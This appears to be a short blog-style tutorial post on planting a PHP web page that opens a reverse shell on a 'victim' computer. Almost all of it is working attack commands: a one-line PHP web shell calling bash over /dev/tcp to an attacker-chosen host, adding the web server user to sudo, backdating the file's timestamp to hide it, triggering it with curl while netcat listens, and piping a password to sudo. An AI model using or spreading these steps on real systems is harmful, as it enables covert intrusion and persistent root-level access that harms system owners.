---
layout: post
title:  "Reverse shell using PHP site"
categories: reverse_shell
summary: Create reverse shell with PHP site
---

{% include instructions.md %}

### {{page.title}}

Install Apache and PHP to victim’s computer and create PHP file that will open a reverse shell when the page is requested by HTTP protocol.

```shell
# apt install apache2 php libapache2-mod-php
# adduser www-data sudo
# passwd www-data

# nano /var/www/html/example.php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/" . $_GET["x"] . "/" . $_GET["y"] . " 0>&1'"); ?>

# touch /var/www/html/example.php -r /var/www/html/index.html
# service apache2 restart
```

In attacker’s computer listen 51920 port using Netcat and send HTTP request to malicious site. With HTTP request the victim’s computer will open the reverse shell
```shell
# nc -l -p 51920
# curl 'http://[victim ip address]/example.php?x=[attacker domain]&y=51920'
```

This is how you can give password using only one line example in reverse shell
```shell
$ echo 'password' | sudo -S command
```

